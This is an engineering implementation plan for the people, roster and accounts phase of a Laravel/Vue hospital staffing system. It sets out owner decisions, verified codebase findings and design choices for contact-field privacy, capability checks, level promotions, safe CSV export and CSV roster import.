> **Both open questions are now DECIDED (2026-08-09), not defaults — do not revisit:**
>
> - **Roster import is CSV-only.** No spreadsheet package is added. Deviates from ST-04's
>   letter; record it in the design doc's override table. The reader interface must stay shaped
>   so an xlsx adapter could slot in behind it later without rework.
> - **The invitation-lifetime setting lives behind `settings.manage`**, beside SMTP, VAPID and
>   the operational-alert address. It is a credential-exposure parameter and belongs with the
>   other security parameters, on one screen an administrator can review in a single pass.
>   (That work is P1c-2; noted here so it is not re-litigated there.)

> ## OWNER DECISIONS, 2026-08-09 — READER'S INDEX ONLY
>
> **Every decision below is already folded into the task text it governs.** This block is a
> reader's index, not a patch applied on top of tasks that contradict it. Three times in this
> programme a plan carried decisions in a prepended block and left the task text below unchanged;
> twice an implementer was then instructed by task text to build the thing the decision had
> forbidden (P1b Task 1's `clinic_owner` seed, P1b Tasks 6/7/8's `terminal` column). Both were
> caught only because the implementer read the block first. **If any task text below appears to
> disagree with this index, the task text is the bug — but it should not, because it was written
> after these decisions, not before.**
>
> **1. There is no terminal level and none is to be inferred.** `levels.terminal` and
> `Level::nextAfter()` were deliberately not built (P1b Owner Decision A), and
> `LevelLadderTest::test_there_is_no_terminal_column_and_no_next_after_inference` pins their
> absence. LV-03's annual promotion stays one-action, previewed, single-transaction and audited —
> but the **operator chooses the target level explicitly**. Nothing in P1c encodes "one step up".
> The reasoning is worth keeping: a terminal marker fails silently in two directions — an
> unmarked top level advances a cohort into a level that does not exist, and a wrongly-marked
> middle level graduates one a year early. → **Task 10.**
>
> **2. `EXT` is outside the ladder and is never promoted.** It is offered as neither a promotion
> source nor a target; `Level::scopeInternal()` (shipped P1b) is the one predicate that says so.
> → **Task 10.**
>
> **3. Roster import (ST-04) is built and tested against synthetic fixtures only.** No real staff
> list enters the repository. The fixtures deliberately exercise duplicate emails, a person
> already on the roster, missing required columns, mixed-case and whitespace-padded headers, an
> unknown level code, Arabic names, and a row that would collide with an existing account. **The
> dry-run preview is a requirement, not a nicety: the first real import must hold no surprises.**
> → **Tasks 11 and 12.**

# P1c — People, Roster and Accounts

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development
> (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use
> checkbox (`- [ ]`) syntax for tracking.

**Goal:** Munawib Stage 1's people layer — the roster becomes something an administrator can
see, edit, bulk-operate, promote and import. P0c built the storage (`people`, `person_levels`,
`levels`, the `users.person_id` link) and proved it cannot leak a credential. P1b built the
ladder those people climb. **Nothing has ever read or written any of it from a screen.**

**Binding requirements:** PE-01, PE-02, PE-03, LV-02, LV-03, LV-04, ST-04 — plus ST-06 held
(every date still goes through `App\Support\Calendar`) and D9 held (`SignoffPickers`' per-field
parity survives everything done here).

**Tech Stack:** Laravel 13, PHP 8.4, Inertia 3 + Vue 3, PHPUnit 12 (SQLite in-memory,
`APP_TIMEZONE=Asia/Riyadh`), Vitest, Playwright, Tailwind 4 via `@theme`, MySQL 8.4 in
production.

**Baseline this plan was written against:** branch `feat/p1-master-rota` at `38e81dd` (the P1b
merge), `php artisan test` = **886 tests, 3992 assertions, 0 failures, 0 skipped** (run via
Bash, after `npm run build`), `npm test` = **111**. Every task below states the count it expects
to leave behind.

**Scope of P1c specifically:** one new capability, two additive migrations, one policy (the
first in this codebase — `app/Policies/` does not exist), one projection class, three new
support classes, four new screens, and the first CSV writer and the first file upload the
application has ever had. **No account is created anywhere in it.**

**What P1c is NOT.** It does not touch `handovers`, `handover_revisions` or any clinical row. It
does not build the rota grid (P1d) or clinics (P1e). It builds **no path from a roster entry to
a credential** — the invitation flow remains the only one, and a guard test asserts that
`PersonController` and the roster importer never write to `users`. And per the split below, it
does not ship AC-01…04's account-side work: that is **P1c-2**, scoped at the end of this
document and planned when this one merges.

---

## Owner decisions carried in from P1 and P1b

All six P1 decisions and both P1b decisions remain binding. Three land as code here:

- **P1 decision 1 — the ladder is `R1, R2, R3, R4, EXT`, seeded and then editable.** Shipped
  (`ReferenceSeeder.php:153-158`, `display_order` 10/20/30/40/90, `EXT` external). Task 10's
  promotion pickers read it through `Level::scopeInternal()`; they never hardcode a code.
- **P1 decision 5 — invitation lifetime is configurable, default 7.** Deferred to **P1c-2** with
  the rest of AC-02, and recorded as still-unbuilt in design §14 item 13 by Task 13 rather than
  silently dropped.
- **P1b decision A — no terminal level.** Task 10 is the screen it was written for. Task 10
  extends `LevelLadderTest`'s absence guard rather than relying on it, because P1c is the first
  plan with a live reason to want the inference.

---

## Findings

Read these before any task. Each was verified against the tree at `38e81dd` by running or
grepping, not inferred from a document.

1. **`app/Policies/` does not exist, and `Gate::before` returns `true` for any string that
   happens to be a capability key.** `ls app/Policies` → no such directory; the only Gate wiring
   in the codebase is `AppServiceProvider.php:56-62`, which bridges `AccessControl::allows()`
   into the Gate and **returns `null` on a miss so ordinary policies still run**. PE-02 creates
   the first policy in this codebase. The load-bearing consequence: a policy ability must never
   be named the same as a capability key, or `Gate::before` short-circuits it to `true` for
   every holder and the policy never executes. P1c's abilities are camelCase (`viewContact`),
   capability keys are dot-notation (`people.manage`) — Task 2 asserts that separation with a
   test, because it is a silent-bypass class of bug, not a style preference.

2. **`Person::$hidden` is NOT what will keep staff phone numbers out of Inertia props, and
   believing it is would leak them on day one.** `$hidden = ['phone', 'notes']`
   (`Person.php:51`) applies to `toArray()`/`toJson()` only. **Every admin controller in this
   codebase builds its props with an explicit `present()` map** — `UnitController::present()`,
   `LevelController::present()`, `UserManagementController::index()`'s three closures — which
   read attributes directly and never touch `$hidden`. A People screen written in the house
   style with `'phone' => $person->phone` publishes the number to every viewer regardless of
   `$hidden`. Verified: `grep -rn -- "->phone|->notes"` across `app/`, `resources/js/` and
   `database/` returns **zero** reads today — only the model's own `$fillable`/`$hidden` entries
   and the migration. P1c therefore has a clean slate and Task 2 keeps it that way with
   `App\Support\PersonPresenter` as the single projection plus a source-level guard.

3. **`people.external` has no writer that ever sets it true.** Both live writers hardcode
   `false` (`UserManagementController.php:169`, `LegacyImport.php:181`), as do
   `PersonFactory.php:30` and the P0c backfill (`2026_08_10_120001:113`).
   `SignoffPickers::offer()` returns `['id', 'name', 'retired'?]` and never surfaces it. PE-03's
   *"flagged everywhere"* is entirely unbuilt. Task 5 makes it real.

4. **`person_levels` has no overlap constraint, no batch identity, no reason and no author.**
   The only unique is `(person_id, effective_from)` (`2026_08_10_120002:51`). Two open-ended
   spans for one person coexist happily and `Person::levelAt()` (`Person.php:119-129`) silently
   resolves the later `effective_from` with no error. There is also **no `PersonLevelFactory`** —
   `PersonLevel` does not even `use HasFactory`. Tasks 6 adds the three provenance columns and
   the single writer **before** the first promotion runs, which is the only time it can be done
   additively (P1 finding 9).

5. **`Person::levelAt()` is one query per person with no set-wise sibling.** A People list of 60
   showing "current level" is 60 queries; a promotion preview over a cohort is the same again.
   Task 3 adds `Person::levelsAt(Collection, $date)` sharing **one** predicate definition with
   `levelAt()` — two copies of one predicate is the drift CLAUDE.md blames for the audit-chain
   false alarm.

6. **`AccessControl::resolve()` keys off `people.position` through a read-through accessor, and
   nothing outside `UserManagementController::setPosition()` busts the cache.**
   `AccessControl.php`'s `resolve()` reads `$user->position`, which is
   `$this->person?->position` (`User.php`). `capabilitiesFor()` caches for `CACHE_TTL = 600`
   seconds. `grep -rn "AccessControl::flush"` over `app/` + `database/` returns five call sites,
   **none of them a `people.position` write except `setPosition()`** (`:296`). A People screen
   that edits `position` — and PE-01's field set includes the job role — would leave a demoted
   administrator holding administrator capabilities for up to ten minutes, **and** would bypass
   `isLastActiveAdministrator()` entirely, which is the guard that stops the last admin being
   demoted. **Decision C** resolves this with one definition.

7. **`Level::scopeActive()` is not table-qualified and `Person::scopeActive()` is.**
   `Level.php`: `$query->where('active', true)`. `Person.php`: `$query->where('people.active',
   true)` — explicitly join-safe. Both `levels` and `people` carry an `active` column, so any
   P1c query that joins them and calls `Level::active()` gets `SQLSTATE[HY000]: General error:
   1 ambiguous column name: active`. Every P1c query that touches both writes its predicate
   table-qualified; Task 3's resolver does so in the one place it is defined.

8. **There is no spreadsheet package in `composer.lock` at all, and `ext-zip` is present but
   undeclared.** `grep -c "openspout\|phpspreadsheet" composer.lock` → **0**. `composer.json`'s
   `require` declares `ext-intl` and nothing else PHP-extension-wise, yet `zip` is installed in
   the image (`Dockerfile:76`), in CI (`ci.yml:30`: `mbstring, sqlite3, pdo_sqlite, gd, intl,
   zip`) and locally (`php -m`). So xlsx is *reachable* but needs both a composer package and a
   `composer.json` line. **Decision E** settles what ST-04 ships and what it defers.

9. **`post_max_size=8M` / `upload_max_filesize=4M` / `memory_limit=256M` (`Dockerfile:88-90`),
   and exceeding `post_max_size` produces an EMPTY request, not an exception.** PHP discards the
   body: `$_POST` and `$_FILES` come back empty, `$request->file('file')` is `null`, and no
   exception is raised. A roster import that only validates `required|file` reports "the file
   field is required" for a 9 MB upload — a message that sends the operator looking for a
   missing field. Task 12 validates the size explicitly *and* detects the empty-POST shape,
   which is the only way to say the true thing.

10. **Two email normalizations exist.** `Person::normalizeEmail()` (mb-safe lowercase, trim,
    `''` → `null`) and, inline, `Invitation::issue()`'s `Str::lower(trim($email))`. Equivalent
    for ASCII, not mb-safe, and it cannot produce `null`. The roster importer uses
    `Person::normalizeEmail()` — the one definition — and Task 13 records the second as an open
    tidy for P1c-2, which owns `Invitation` anyway.

11. **`AuditLog::record()` has no batch path and `AuditAnomalies`' watch list is a hardcoded
    array.** Each `record()` call opens its own transaction and takes `lockForUpdate` on the
    chain tail (`AuditLog.php:58-83`); the single-occurrence watch list is a literal array in
    `app/Console/Commands/AuditAnomalies.php:83-94` and each entry fires `OpsAlert::critical`
    **per occurrence**. Reusing `user_role_change` for a 40-person promotion means 40 critical
    alerts for one routine annual act; a fresh action name goes unmonitored unless deliberately
    added. **Decision H** resolves both.

12. **`ManagerScope::assertMayTarget()` audits its refusal and then `abort(403)`s** —
    `ManagerScope.php:56-70`. Inside a transaction the audit row unwinds with the abort and the
    attempt vanishes from the trail. `InvitationController::store():87-105` already solves this
    by authorizing the **entire** superseded set in a full pass before any mutation. Tasks 9 and
    10 copy that ordering exactly.

13. **`isLastActiveAdministrator()` is set-blind** (`UserManagementController.php:437-451`): it
    asks whether another active administrator exists *besides this one*. A bulk deactivation of
    the last N administrators passes all N individual checks and empties the admin set
    permanently. Same shape as the 2026-07-26 `pickerRule()` finding. Task 9's guard is
    set-aware by construction.

14. **`CalendarWritersFlushTest::WRITE_NEEDLES` includes `Institution::current()`.** Any new file
    reading the institution row — including for a column that has nothing to do with the calendar
    — trips that guard and must be allow-listed with a stated reason
    (`tests/Feature/Build/CalendarWritersFlushTest.php:33-53` already carries five such entries).
    Task 2 adds one, and states the reason accurately: `Calendar::settings()`'s memo holds the
    six calendar values as an array, not the model, so a write to a non-calendar column leaves
    nothing stale for `flush()` to clear.

15. **`SignoffPickers::offer()`'s return shape is a live client contract.** `Sheet.vue:358-406`
    renders `s.retired ? \`${s.name} (no longer offered)\` : s.name` at four sites. Adding a key
    is additive and safe; changing or removing one is not. Task 5 adds `external` and extends all
    four labels in the same commit.

16. **There is no CSV writer anywhere in the codebase.** `grep -rn "fputcsv\|text/csv\|League\\Csv"`
    over `app/` and `resources/` returns nothing. LV-02's export is the first, which makes it the
    first opportunity to get formula-injection neutralisation right rather than retrofit it —
    and a hospital spreadsheet imported and re-exported is exactly the round trip that weaponises
    it (P1 plan, P1c item 14). **Task 8**, and it lands *before* the export that needs it.

17. **`AccessControlParityTest::expectedByPosition()` hardcodes the Administrator set by name**
    (`:37-40`, the `$adminOnly` array). P1b's Task 2 amendment records this going red the moment
    `structure.manage` was seeded. `people.manage` will do the same. Task 1 updates it in the
    same commit — this is the expected, legitimate kind of red, not drift.

18. **`bg-panel-soft` still compiles to nothing** and is still used at
    `resources/js/Components/StaffPrivacyNotice.vue:25`. P1c's four new screens use
    `bg-ground-deep` for table headers and inset surfaces (P1 finding 13). Relatedly
    `Users.vue:364` has `colspan="7"` on an eight-column table — P1c-2 touches that file and
    fixes it there, not here.

19. **`UserFactory::definition()` still writes `member_email` on `users`.** The column is dead on
    every live write path (design §5.1) but the factory populates it, so a test asserting "no
    P1c code writes `users.member_email`" must scope itself to `app/` and `database/seeders/`,
    not to `database/factories/`.

20. **`openInvitations()` returns OPEN invitations only** (`InvitationController.php:173-190`:
    `whereNull('accepted_at')->whereNull('revoked_at')->where('expires_at','>',now())`), and its
    `?User $viewer` parameter is declared and never used — the caller does the scoping. AC-02's
    *"claim status visible"* therefore renders nothing today for an accepted, revoked or expired
    invitation. **P1c-2**, not here; recorded so the People screen does not grow a half-version
    of it.

---

## Where the design doc, the P1 plan and the Munawib spec are wrong about this codebase

Every plan in this project so far has found at least one; P1b found seven. These are P1c's.

| Claim | Reality |
|---|---|
| P1 plan, P1c item 3: PE-02 is *"a policy-gated **projection**, additive over `Person::$hidden = ['phone','notes']` — never a removal of `$hidden`, **which is currently the only thing keeping staff phone numbers out of Inertia props**"* | The second half is **false and dangerous** (finding 2). `$hidden` bites on `toArray()`/`toJson()`; every admin screen in this codebase builds props with an explicit `present()` map that bypasses it entirely. `$hidden` keeps `phone` out of an *accidental* whole-model serialisation and nothing else. Treating it as the control would ship the leak. The control is `PersonPresenter` + a source-level guard (Task 2); `$hidden` stays as defence in depth, correctly described. |
| Design §5.1: `people` has *"`joined_at`"* under PE-01 | Correct, and the column exists — but PE-01's *"status"* has **no column and must not get one.** `people.active` is the only state flag and it governs naming; "claimed" is a join (`Person::hasAccount()`). Reintroducing a `status`/`person_status` enum is the twelve-defence-sites problem the table split exists to avoid (design §5.1 deviation 3, CLAUDE.md). P1c's "Status" column on screen is **derived** — Active/Retired × Account/Roster-only — never stored. |
| Munawib PE-01: *"level (effective-dated)"* alongside AR-05's `people/{personId} { levelId, levelHistory: [...] }` | AR-05 asks for both a current pointer and a history array. This repo deliberately has only the history (`2026_08_10_120002:10-14`). Finding 5's set-wise resolver is the performance answer; a `people.level_id` pointer is not. Already recorded in the P1 master plan's own table — restated because P1c is the first plan with a screen that would be tempted. |
| Munawib LV-03: *"annual promotion **advances a cohort one level**"* | Overridden by P1b Owner Decision A, restated at the top of this plan: the operator names the target level. Everything else in LV-03 (one action, full preview, single-transaction commit, audit entry, graduates become inactive and are never deleted) ships exactly as written. |
| Munawib LV-02: bulk *"resend invitations"* | An **account** action, not a roster one, and it depends on AC-02's resend endpoint which does not exist. P1c-1 ships set level / set status / deactivate / export; **bulk resend lands in P1c-2** with the rest of AC-02, stated on the screen rather than shipped as a dead button. |
| Munawib ST-04: *"**xlsx**/csv with column mapping, validation report, dry-run preview"* | Column mapping, validation report and dry-run preview ship. **xlsx does not** — there is no spreadsheet package in `composer.lock` and adding one to a system holding children's PHI is an owner's supply-chain decision, not a developer's (finding 8). **Decision E**: the reader is a port with a CSV/TSV adapter, so xlsx is one class and one composer line when the owner says so. |
| Munawib §5: *"View contacts — Resident: **policy**"* | Implemented as a two-valued department setting, not a per-field toggle matrix. **Decision B** explains why two values are the honest number. |
| P1 plan, P1c item 12 (AC-04): *"`user_capabilities` is keyed to the **account** … Moving it touches `AccessControl::resolve()`, `holdersOf()` and the cache key"* | Correct, and it is exactly why AC-04 is **not** in P1c-1. It is a security-boundary change to the capability resolver on a system holding PHI; it deserves its own plan and its own review, not the tail end of a thirteen-task roster plan. → **P1c-2**. |

---

## Decision A: one new capability, `people.manage` — not `users.manage`, not `structure.manage`

`users.manage` is the **account** console: approve a registration, activate an account, change a
role, correct a login, issue an invitation. `people.manage` is the **roster**: who exists, what
level they hold, their contact details, their scheduling constraints, whether they are external.

They are different objects. A roster-only person — the external consultant who is named on
sheets and has never logged in — is **invisible to `users.manage` by construction**, because
that console's list is `User::query()->join('people', …)`. And the blast radii differ:
`users.manage` mints and revokes credentials; `people.manage` edits names of record that get
**frozen onto medico-legal evidence** the moment a sheet is signed (`handover_signoffs`' four
`*_person_id` columns plus their frozen `*_name` snapshots).

`structure.manage` is wrong for a third reason: it is the department's *shape* — units, levels,
calendar, periods, holidays — and it was deliberately scoped that way in P1b's own Decision A. A
person is not a shape. A department administrator who may rename a ward is not thereby someone
who may read every clinician's mobile number.

`people.manage` defaults to **Administrator only**, grantable per role or per named user like
every other key. It is added to `AccessControlSeeder::CATALOG`, `::DESCRIPTIONS` and
`::ROLE_DEFAULTS[0]`, to `docs/spec/08-foundation.md`'s catalog **and** role-defaults lines
(lines 36 and 38), to `AccessControlParityTest::expectedByPosition()`'s `$adminOnly` array
(finding 17), and to `AppLayout.vue`'s `canAdmin` computed and its nav — **all in Task 1's single
commit.** Omitting the last of those leaves a user holding only the new capability with no
Administration section at all, which is the recon frontend risk P1b's own Decision A names.

## Decision B: contact visibility is a two-valued department setting, and the projection is the enforcement

Munawib §5 gives Residents *"policy"* access to contacts; PE-02 says *"contact visibility per
policy toggles, logged-in members only"*. Two things follow, and only one of them is obvious.

**The setting.** `institutions.contact_visibility`, a string with exactly two values:

- `admins` (**default**) — only holders of `people.manage` see `phone` and `notes`.
- `members` — any authenticated account holder sees `phone`; `notes` stays `people.manage`-only
  regardless.

Two values, not a per-field matrix, and `notes` never joins the toggle. `notes` is free text a
supervisor writes *about* a named colleague; `docs/COMPLIANCE.md:113-123` already records it as
stored in the clear and legible in every backup, with `$hidden` named as the compensating
control. A department cannot opt its way out of that; a phone number for the on-call list is a
different kind of fact from a note about someone's performance. Default `admins` because Munawib
§3 says *"privacy by default"* and because a department that wants the directory open can say so
in one click, whereas a department that discovers its notes were readable cannot un-read them.

**The enforcement is the projection, not the model.** Finding 2 is the reason. `App\Support\
PersonPresenter` is the **only** place a `Person` becomes Inertia props, it takes the viewing
`?User`, and contact keys are **absent from the array** — not null, not empty-string — when the
policy refuses. Absent, because a `null` phone and a withheld phone look identical on screen and
a future consumer will eventually render one as the other.
`tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php` asserts at source level that no file
under `app/` reads `->phone` or `->notes` off a person outside `PersonPresenter`, with an
allow-list that starts empty except for the presenter and the model itself — finding 2 confirmed
zero existing readers, so the guard lands green.

**The policy is a real policy**, `App\Policies\PersonPolicy` — the first in this codebase, and
`app/Policies/` does not exist yet. Its abilities are `viewContact` and `viewNotes`, camelCase,
because `Gate::before` (`AppServiceProvider.php:56`) returns `true` for any ability string that
is a capability key and a dot-notation ability name would be silently short-circuited past the
policy for every holder (finding 1). Task 2 asserts that separation.

## Decision C: one definition of "change a person's job position"

Finding 6 is two bugs wearing one coat: a stale capability cache and a bypassed last-admin guard.
Both come from there being two places that could write `people.position` once P1c ships a People
screen.

`App\Support\PositionChange::apply(Person $person, int $position, Request $request): void` is the
one definition. It:

1. refuses when the person's linked account is the **last active Administrator** and the new
   position is not 0 — the same rule `UserManagementController::isLastActiveAdministrator()`
   enforces today, moved here so there is one copy;
2. writes `people.position`;
3. calls `AccessControl::flush((int) $user->getKey())` when — and only when — a linked account
   exists, because a roster-only person has no cached capability set to bust;
4. audits `user_role_change` with `person=<id>;user=<id|none>;position=<n>`, ids only.

`UserManagementController::setPosition()` is **refactored onto it in the same task**, so the
account console and the People screen cannot drift. This is the 2026-07-26 "offered and validated
from one definition" discipline applied to a write instead of a picker, and it is a real fix, not
a tidy: today a People screen written in the house style would be a ten-minute privilege-retention
window with no test that would notice.

## Decision D: the promotion takes its target level as input, and `EXT` is on neither end

Restating P1b Owner Decision A as the shape Task 10 builds, because this is the task it was
written for:

- The screen asks for **a source level** (the cohort) and **a target level** (where they go).
  Both come from `Level::query()->internal()->active()->ordered()`, which is P1b's shipped
  predicate — `EXT` is `external = true` and therefore appears in neither list.
- **Nothing computes the target.** There is no `nextAfter()`, no `terminal` column, no
  `display_order + 10` arithmetic, no "the next level by order" fallback. If the operator picks
  R2 → R2 the preview says so and the commit is refused as a no-op; if they pick R4 → R1 the
  preview says so and commits, because the system does not know that is wrong and must not
  pretend to.
- Task 10 extends `LevelLadderTest`'s existing absence guard to scan the P1c namespace too, so a
  later plan reaching for the inference fails the build rather than shipping it.
- **Graduates.** LV-03 says *"graduates become alumni/inactive, never deleted."* With no terminal
  level there is no automatic graduation, so the promotion screen offers a separate, explicitly
  chosen **"retire this cohort instead"** action on the same preview: same source level, no
  target, sets `people.active = false` across the selection and closes the open level span. It is
  a second button on one screen, never a target-level value that means "out".

## Decision E: ST-04 ships CSV/TSV with no new dependency, behind a reader port; xlsx is an owner decision, named

Finding 8: there is no spreadsheet package in `composer.lock`, and adding one to a system holding
children's PHI is a supply-chain decision the owner takes. Hand-rolling an xlsx parser (a zip of
XML with shared-string tables, inline strings, date serials and style-dependent formatting) in
this codebase would be worse than either option.

So:

- `App\Support\Roster\RosterReader` is an **interface** — `headers(): array` and
  `rows(): iterable<array<string,string>>`.
- `App\Support\Roster\CsvRosterReader` is the only adapter, built on PHP core (`SplFileObject`),
  handling comma and tab delimiters, a UTF-8 BOM, and CRLF.
- **Encoding is refused, not mangled.** Excel's plain "CSV" export uses the system codepage and
  turns Arabic names into mojibake that imports *successfully* and is then wrong forever. The
  reader validates the whole file with `mb_check_encoding($contents, 'UTF-8')` and refuses a
  non-UTF-8 file with a message naming the fix ("Save As → CSV UTF-8"), rather than importing
  garbage. This is why the fixture corpus carries Arabic names: it is the case that proves the
  check.
- The screen says plainly what it accepts and how to produce it from Excel. It does not silently
  reject an `.xlsx` with "invalid file".
- **The owner decision to record:** adding `openspout/openspout` (MIT, zero runtime dependencies,
  streaming — it suits the 256 M `memory_limit` and the 4 M upload cap) would make xlsx one new
  class, `XlsxRosterReader`, implementing the same interface, plus one `composer.json` line and
  `"ext-zip": "*"` made explicit (zip is already installed in the image, CI and locally — finding
  8). Nothing in the preview, the validation report or the commit path changes. Task 13 writes
  this into `docs/OPEN-DECISIONS.md` as a live question with its cost stated, not as a limitation
  discovered later.

## Decision F: `App\Support\Csv` is the one CSV writer, and it neutralises formulas on the way out and on the way back

Finding 16: there is no CSV writer today, so this is a greenfield choice rather than a retrofit.

- Any cell whose first character is `=`, `+`, `-`, `@`, TAB (0x09) or CR (0x0D) is prefixed with a
  single apostrophe on write. That is the OWASP-standard neutralisation and it is the only one
  that survives being opened in Excel, LibreOffice and Google Sheets alike.
- **The reader strips exactly one leading apostrophe** from any cell that would otherwise begin
  with one of those six characters. Without the pairing, export → re-import silently renames
  `=Ward` to `'=Ward` and does it again on every round trip. The pairing is asserted by a
  round-trip test, not by inspection.
- A UTF-8 BOM is written, because without it Excel opens Arabic names as mojibake and the
  operator's reasonable conclusion is that the system corrupted them.
- One writer means one place to be right. `Csv::stream(string $filename, array $headers,
  iterable $rows): StreamedResponse`.

## Decision G: `person_levels` has exactly one writer, and it skips rather than upserts

Finding 4 gives `person_levels` three provenance columns (`promotion_batch_id`, `reason`,
`created_by`) — additive, nullable, and only possible before the first promotion runs.

`App\Support\LevelAssignment::assign(Person, Level, string $effectiveFrom, array $context): string`
becomes the **only** thing in the codebase that writes the table (asserted at source level by
`tests/Feature/Build/PersonLevelsHaveOneWriterTest.php`). It:

- closes any open prior span by setting `effective_to` to the day **before** `$effectiveFrom`
  (`Calendar::addDays($from, -1)`), which is correct precisely because `Person::levelAt()` is
  inclusive at both ends — no gap, no overlap;
- refuses to create a span that would overlap a **closed** later span, returning a named outcome
  rather than throwing, so a bulk caller can report it per person;
- on a collision with `unique(person_id, effective_from)`, **pre-checks and skips**, returning
  `'skipped_existing'`. It never upserts. An upsert on that key would rewrite an existing
  historical row's `level_id` — silently changing what level someone held on a date that may
  already have been rendered beside a signed handover. Skipping and reporting is the only safe
  branch;
- returns one of `'assigned' | 'skipped_existing' | 'skipped_same_level' | 'refused_overlap'`, so
  every caller's report is built from the writer's own answer rather than from a guess made
  before the write.

## Decision H: the promotion audits one summary row plus one row per person, and only the summary is watched

Finding 11, resolved in two parts.

**Actions.** `person_promotion` (one row: `batch=<uuid>;from_level=<id>;to_level=<id>;n=<count>`)
plus `person_level_change` per person (`person=<id>;level=<id>;batch=<uuid>`). Ids and counts
only — never a name, never a level *code*, which is administrator-authored free text.

**Only `person_promotion` joins `AuditAnomalies`' single-occurrence watch list**
(`app/Console/Commands/AuditAnomalies.php:83-94`). Every entry there fires `OpsAlert::critical`
once per occurrence; adding the per-person action would page an operator forty times for one
routine annual act, and an alert channel that cries wolf forty times is one nobody reads on the
forty-first. One summary row per promotion gives exactly one finding per promotion, which is the
right amount of human attention for "a cohort's training level changed".

**Ordering.** The level writes run in one transaction; the audit rows are written **after it
commits**, matching `AccessControlController::applyRoleSet()` (`:104-208`) exactly.
`AuditLog::record()` opens its own transaction and takes `lockForUpdate` on the chain tail, so N
of them nested inside one outer transaction serialise the whole chain for its duration — and,
worse, unwind with it if the outer transaction rolls back, erasing the record of an attempt.
The trade-off is stated plainly rather than hidden: a process death between commit and audit
leaves level changes with no trail row. That is the same exposure `applyRoleSet()` already
carries, and consistency with the established shape beats a second, differently-wrong ordering.

## Decision I: nothing in P1c creates an account, and a test says so

The invitation flow remains the only path from a roster entry to a credential (design §5.1's
claim lifecycle; `RosterOnlyCannotAuthenticateTest` is what proves the structural half).
`tests/Feature/Build/RosterNeverMintsCredentialsTest.php` asserts at source level that
`PersonController`, `PromotionController`, `RosterImportController` and
`App\Support\Roster\RosterImport` contain no write to `users` — no `User::create(`, no
`DB::table('users')->insert`, no `->save()` on a `User`. This is cheap, it is the fifth guard of
its species in this codebase, and it closes the one thing a roster importer is most likely to be
"helpfully" extended to do.

---

## The split: P1c-1 (this document) and P1c-2

**Recommendation: split, at the person/account seam.** P1c as scoped in the P1 master plan is
fourteen items covering two different objects with two different security stories. Written as one
plan it would be the largest document in this programme and its second half would be a
security-boundary change (AC-04 moves capability grants off the account) buried behind twelve
tasks of roster work.

| | Scope | Binding requirements | Depends on |
|---|---|---|---|
| **P1c-1** *(this document, 13 tasks)* | `people.manage`; the People screen; PE-01's full field set with one definition of a position change; PE-02's policy, projection and department setting; PE-03 made real; `Person::levelsAt()`; `person_levels` provenance and its single writer; LV-04 history; the safe CSV writer; LV-02 bulk set-level / set-status / deactivate / export; LV-03 annual promotion; ST-04 roster import (CSV/TSV, dry-run, commit). | PE-01…03, LV-02 (roster subset), LV-03, LV-04, ST-04 | P1a, P1b |
| **P1c-2** *(scoped below, ~6 tasks)* | AC-02 configurable invitation lifetime, resend singly and in bulk, claim status visible; AC-03 unbinding; AC-04 per-person roles; LV-02's bulk **resend**; the `Users.vue` tidies P1c-1 deliberately does not make. | AC-01…04, LV-02 (account subset) | P1c-1 |

**Why the seam is here and not elsewhere.** Everything in P1c-1 operates on `people` and
`person_levels` and never touches `users`, `invitations`, `user_capabilities` or
`AccessControl::resolve()` — Decision I's guard test is what keeps that true rather than merely
intended. Everything in P1c-2 operates on the account side and needs the People screen to exist
to hang off. The tree is deployable and the suite green at the end of every task in P1c-1, and
**P1d (the master rota) depends only on P1c-1**: the grid's rows are people, ordered by level,
which is exactly what Tasks 3, 6 and 7 deliver. P1c-2 can be planned and merged in parallel with
P1d if it comes to that.

**Within P1c-1 there is a declared seam too,** on P1b's precedent: Tasks 1–8 (the person, the
projection, the ladder plumbing, the CSV writer) and Tasks 9–12 (the bulk operations that stand
on them). If execution stalls, merge after Task 8. Do not split anywhere else — Tasks 1/2/3 must
land in that order and none of them is independently useful, and Task 8 must precede Task 9 or
the first export ships unescaped.

---

## Migration ordering

P1b used `2026_08_13_*`. P1c uses `2026_08_14_*` so it sorts strictly after:

```
2026_08_14_120001_add_contact_visibility_to_institutions   (Task 2 — additive, defaulted)
2026_08_14_120002_add_provenance_to_person_levels          (Task 6 — additive, nullable)
```

Both are additive. `120001` adds one defaulted string column to a table holding at most one real
row per deployment (D11); `120002` adds three nullable columns to a table that has **never had a
production write** (no promotion has run, no screen writes level history) — which is exactly why
it must land now: retrofitting provenance after the first promotion is not additive, it is a
backfill of facts nobody recorded (P1 finding 9). Nothing is retyped, nothing is dropped, no
clinical table is touched. The owner runs production migrations (CLAUDE.md); Task 13 supplies the
verification queries for `docs/RUNBOOK-DEPLOY.md`.

P1d continues at `2026_08_15_*`, P1e at `2026_08_16_*`. **P1c-2 uses `2026_08_14_1201*`** (a
second series in the same day slot) so it can be planned and merged independently of P1d without
either renumbering.

---

## Amendments made during execution

*(Empty at plan time. Follow the P0c/P0d/P1a/P1b convention: when a task turns up something this
plan's enumeration missed — a site not listed, a test that goes red for a reason the plan did not
predict, a behaviour that differs between SQLite and MySQL — record it here, dated, with what was
found and how it was resolved. Findings caught empirically rather than by inspection are the ones
worth writing down. P1a recorded nine amendments across nine tasks and P1b eight across thirteen,
including two real plan errors and seven owner-decision conflicts; assume this plan is wrong
somewhere too.)*

---

## Conventions every task follows

Stated once, not repeated per task.

**Verification runs under Bash, never PowerShell.** PowerShell's PATH on this machine lacks
`openssl`, so the backup tests self-skip there and the suite reports green without exercising
them — a false green indistinguishable from a real one. Every command block in this plan opens
with:

```bash
export PATH="/c/Users/ahmed/AppData/Local/php84:/c/Users/ahmed/AppData/Local/composer-bin:$PATH"
```

**`npm run build` runs before `php artisan test`**, or `CompiledCssIsLightOnlyTest`'s artifact
layer and the print-CSS check skip rather than pass (P1 finding 15).

**Frontend.** Every page is `AppLayout` + `useCan()`, `useForm()` for writes, `preserveScroll`
(and `preserveState` where an indicator must survive), `form.errors.*` rendered as
`text-critical`, `form.recentlySuccessful` as the "Saved." affordance. Reuse `Levels.vue`'s
`inputClass` string verbatim:

```js
const inputClass = 'w-full rounded-md border border-line bg-panel px-3 py-2 text-sm text-ink focus:border-channel focus:outline-none';
```

Semantic classes only: `.readout`, `.channel-tag`, `.channel-bar*`, `bg-panel`, `bg-ground`,
`bg-ground-deep`, `border-line`, `text-ink`, `text-body`, `text-muted`, `text-critical`,
